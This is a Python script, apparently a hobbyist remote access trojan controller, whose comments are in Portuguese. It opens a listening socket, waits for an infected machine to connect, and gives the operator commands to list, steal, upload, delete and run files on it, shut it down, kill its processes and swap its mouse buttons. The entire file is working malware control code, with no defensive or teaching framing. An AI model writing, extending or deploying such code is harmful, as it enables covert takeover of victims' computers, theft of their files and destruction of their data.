import os
import socket
import time

os.chdir(r'/home/taz/Developer/Python/Virus')

#COLORS
RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"
#COLORS

def showLogo():
    print(RED+"   (                                          ")
    print(RED+"   )\    (    (  (       )   (     (          ")
    print(RED+" (((_)   )\   )\))(   ( /(   )(    )(     (   ")
    print(RED+" )\___  ((_) ((_))\   )(_)) (()\  (()\    )\  ")
    print(BLUE+"((/ __|  (_)  (()(_) ((_)_   ((_)  ((_)  ((_) ")
    print(BLUE+" | (__   | | / _` |  / _` | | '_| | '_| / _ \.")
    print(CYAN+"  \___|  |_| \__, |  \__,_| |_|   |_|   \___/ ")
    print(CYAN+"             |___/                            ")
    print("")
    print("by Thiago && Taz|| v1.0"+RESET)

def showCommands():
    print(BOLD+"- turn_off_pc : Desliga o computador") #OK
    print("- openChrome|LINK : Abre o Chrome neste link") #OK
    print("- shutProcess|PROCESS : Desliga um processo") #OK
    print("- shuffleMouse : Inverte as teclas do mouse") #OK
    print("- showDir|PATH : Mostras os arquivos de um diretorio") #OK
    print("- sendFile|FILEPATH : Envia um arquivo") #OK
    print("- deleteFile|FILEPATH : Envia um arquivo") #OK
    print("- exeFile|FILEPATH : Executa um arquivo") 
    print("- downloadFile|FILEPATH : Baixa um arquivo"+RESET) #OK

showLogo()
s = socket.socket()
host = "192.168.88.147"
port = 8080
s.bind((host,port))
print("")
print(RED+"Esperando por conexão..."+RESET)
s.listen(1)
conn, addr = s.accept()
os.system('cls')
print("")
print(GREEN+"/* Conectado ao servidor com sucesso... \*")
print("")
print("/* Iniciando ... \*")
os.system('cls')
while 1:

    showLogo()
    showCommands()
    command = input(str("Command >> ")) #DIGITAR COMANDO
    if "showDir|" in command:
        conn.send(command.encode())
        print("")
        print(GREEN+"Comando recebido e esta fazendo o upload de dados..."+RESET)
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print(RED+files)
        time.sleep(10)
        os.system('cls')
        print(GREEN+"Resultado do diretorio: ", files)
    elif "sendFile|" in command:
        data = command.replace("sendFile|","")
        try:
            file = open(data,"r")
            data = ""
            for lines in file:
                data = data + (lines+"\n")
            data = "sendFile|" + data
            file.close()
            conn.send(data.encode())
            print(GREEN+"Arquivo enviado..."+RESET)
            data = conn.recv(5000)
            data = data.decode()
            print(data)
            time.sleep(2)
            os.system('cls')
        except:
            print(RED+"Erro ao ler o arquivo..."+RESET)


    elif "downloadFile|" in command:
        print(GREEN+"Requisitando arquivo...")
        conn.send(command.encode())
        data = conn.recv(5000)
        data = data.decode()
        file = open("downloadedFile.txt","w")
        file.write(data)
        file.close()
        print(CYAN+"Resultado:")
        print(data)
        time.sleep(5)
        os.system('cls')

    elif "deleteFile|" in command:
        print(GREEN+"Requisitando...")
        conn.send(command.encode())
        print(CYAN+"Resultado:")
        data = conn.recv(5000)
        data = data.decode()
        print(data)
        time.sleep(5)
        os.system('cls')

    elif "exeFile|" in command:
        print(GREEN+"Requisitando...")
        conn.send(command.encode())
        print(CYAN+"Resultado:")
        data = conn.recv(5000)
        data = data.decode()
        print(data)
        time.sleep(2)
        os.system('cls')

    else:
        conn.send(command.encode())
        print(GREEN+"Comando requisitado..."+RESET)
